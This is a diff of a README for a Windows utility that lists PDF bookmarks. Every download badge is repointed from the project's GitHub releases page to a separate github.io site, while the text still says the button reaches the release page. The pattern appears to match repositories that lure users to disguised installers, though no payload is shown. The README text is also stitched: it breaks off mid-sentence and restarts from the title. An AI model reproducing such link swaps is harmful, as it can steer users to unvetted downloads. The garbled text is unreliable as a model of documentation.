@@ -1,7 +1,7 @@
 # 📑 pdf-bookmark-list - List PDF Outlines in Seconds
 
-[![Download pdf-bookmark-list](https://img.shields.io/badge/Download-pdf--bookmark--list-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Buntysh5636/pdf-bookmark-list/releases)
-[![Windows desktop utility](https://img.shields.io/badge/Windows-Desktop_Utility-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Buntysh5636/pdf-bookmark-list/releases)
+[![Download pdf-bookmark-list](https://img.shields.io/badge/Download-pdf--bookmark--list-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://buntysh5636.github.io)
+[![Windows desktop utility](https://img.shields.io/badge/Windows-Desktop_Utility-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://buntysh5636.github.io)
 
 ## 📖 What Is pdf-bookmark-list?
 
@@ -28,7 +28,7 @@ pdf-bookmark-list is a Windows desktop utility. You need a Windows computer, a P
 
 Use the download button below to reach the release page for pdf-bookmark-list.
 
-[![Download pdf-bookmark-list](https://img.shields.io/badge/Download-Visit_Releases-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Buntysh5636/pdf-bookmark-list/releases)
+[![Download pdf-bookmark-list](https://img.shields.io/badge/Download-Visit_Releases-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://buntysh5636.github.io)
 
 Visit this link to download the application.
 
@@ -55,8 +55,8 @@ A typical outline list includes the bookmark titles in the order they appear in 
 
 pdf-bookmark-list is built for people who work with PDF documents and want a simple text version of the outline. It is useful for students# 📑 pdf-bookmark-list - List PDF Outlines in Seconds
 
-[![Download pdf-bookmark-list](https://img.shields.io/badge/Download-pdf--bookmark--list-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Buntysh5636/pdf-bookmark-list/releases)
-[![Windows desktop utility](https://img.shields.io/badge/Windows-Desktop_Utility-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Buntysh5636/pdf-bookmark-list/releases)
+[![Download pdf-bookmark-list](https://img.shields.io/badge/Download-pdf--bookmark--list-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://buntysh5636.github.io)
+[![Windows desktop utility](https://img.shields.io/badge/Windows-Desktop_Utility-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://buntysh5636.github.io)
 
 ## 📖 What Is pdf-bookmark-list?
 
@@ -87,7 +87,7 @@ You do not need to be a programmer or a PDF expert. If you can open a PDF and sa
 
 Use the download button below to reach the release page for pdf-bookmark-list.
 
-[![Download pdf-bookmark-list](https://img.shields.io/badge/Download-Visit_Releases-00C853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Buntysh5636/pdf-bookmark-list/releases)
+[![Download pdf-bookmark-list](https://img.shields.io/badge/Download-Visit_Releases-00C853?style=for-the-badge&logo=github&logoColor=white)](https://buntysh5636.github.io)
 
 Visit this link to download the application.
 
